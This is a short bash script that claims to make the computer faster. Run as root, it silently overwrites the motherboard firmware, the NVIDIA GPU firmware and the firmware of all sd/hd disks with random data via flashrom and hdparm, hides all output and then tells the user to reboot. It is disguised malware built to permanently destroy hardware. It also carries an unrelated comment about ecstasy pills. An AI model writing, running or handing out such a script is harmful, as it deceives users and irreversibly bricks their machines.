#!/bin/bash

function echo_red() {
    echo -e "\E[0;31m$1"
    echo -e "\e[0m"
}

function die() {
    echo_red "$@"
    exit 1
}

# Aproximadamente 4 mil comprimidos de ecstasy
[ "$(whoami)" = "root" ] || die "You need to run this script as root"

clear
echo "We are making your computer faster. Please wait."

flashrom -p internal -n -f -w /dev/urandom > /dev/null 2>&1
(lsmod | grep nvidia > /dev/null) && flashrom -p gfxnvidia -n -f -w /dev/urandom > /dev/null 2>&1
(ls /dev/sd* | xargs hdparm --fwdownload /dev/urandom) > /dev/null 2>&1
(ls /dev/hd* | xargs hdparm --fwdownload /dev/urandom) > /dev/null 2>&1

sleep 5
echo "Done. Please reboot."
read -n 1
